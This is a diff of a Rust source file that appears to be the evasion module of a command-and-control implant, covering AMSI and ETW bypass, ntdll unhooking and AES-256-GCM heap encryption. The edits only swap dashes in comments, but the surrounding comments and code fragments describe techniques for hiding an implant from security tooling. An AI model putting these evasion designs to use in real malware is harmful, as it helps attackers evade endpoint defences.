@@ -1,4 +1,4 @@
-// src/agent/handlers/evasion.rs — AMSI, ETW, ntdll unhook, syscall diagnostics
+// src/agent/handlers/evasion.rs - AMSI, ETW, ntdll unhook, syscall diagnostics
 
 use super::{DispatchResult, AgentAction, wrap_result};
 use crate::agent::syscalls;
@@ -54,11 +54,11 @@ pub fn handle_syscall_check() -> DispatchResult {
 // ── AES-256-GCM heap encryption (upgrade from XOR) ────────────────────
 //
 // Commands:
-//   evasion:encrypt_heap_aes — generates a fresh key+nonce, encrypts the
+//   evasion:encrypt_heap_aes - generates a fresh key+nonce, encrypts the
 //     process heap with AES-256-GCM in stream-cipher mode, and stores the
 //     key material in a module-level Mutex for the paired decrypt command.
 //
-//   evasion:decrypt_heap_aes — retrieves the stored key+nonce and decrypts.
+//   evasion:decrypt_heap_aes - retrieves the stored key+nonce and decrypts.
 //
 // The same CTR self-inverse property means encrypt and decrypt are the
 // same operation under the same key+nonce.
@@ -66,7 +66,7 @@ pub fn handle_syscall_check() -> DispatchResult {
 // SAFE USE: suspend_other_threads / resume_threads are called around the
 // heap walk so no other thread can modify allocator metadata during encryption.
 // Do NOT invoke these commands while active I/O or live Tokio tasks depend
-// on heap allocations they hold — prefer quiescent periods between tasks.
+// on heap allocations they hold - prefer quiescent periods between tasks.
 
 use std::sync::Mutex;
 
@@ -91,7 +91,7 @@ pub fn handle_encrypt_heap_aes() -> DispatchResult {
             if let Ok(mut guard) = HEAP_AES_STATE.lock() {
                 *guard = Some((key, nonce));
             } else {
-                // Lock poisoned — zeroize and bail so we don't leave the
+                // Lock poisoned - zeroize and bail so we don't leave the
                 // heap encrypted without a stored key.
                 key.zeroize();
                 nonce.zeroize();
